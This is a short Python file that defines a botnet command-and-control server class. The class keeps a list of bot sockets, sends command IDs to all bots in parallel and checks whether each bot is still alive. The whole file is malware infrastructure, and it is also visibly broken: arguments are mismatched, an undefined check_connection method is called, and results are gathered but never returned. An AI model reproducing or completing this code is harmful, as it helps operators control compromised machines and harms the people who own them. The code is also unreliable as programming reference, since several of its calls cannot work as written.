import threading
import concurrent.futures

import botnet_exceptions


class C2server():

    def __init__(self, user_id, bot_socket):
        self.user_id = user_id
        self.bots = [bot_socket]

    def execute_command(self, command):
        """
        Command botnet to execute command
        :param command: Command
        :return: bool
        """
        if not self.bots:
            raise NoBotsException()

        with concurrent.futures.ProcessPoolExecutor() as executor:
            futures = [executor.submit(self.command_bot, bot) for bot in self.bots]
        results = [f.result() for f in futures]


    def command_bot(self, command, bot):
        if not self.check_connection(bot):
            return "Dead bot"

        bot.sendall(str(command.commandId).encode())

    def is_bot_alive(self, bot):
        try:
            bot.sendall(b"Are you alive?")
            response = bot.recv(1024)
            if response == b"":
                return False
        # TODO: put in proper exception handling for dead socket
        except:
            return False
        return True
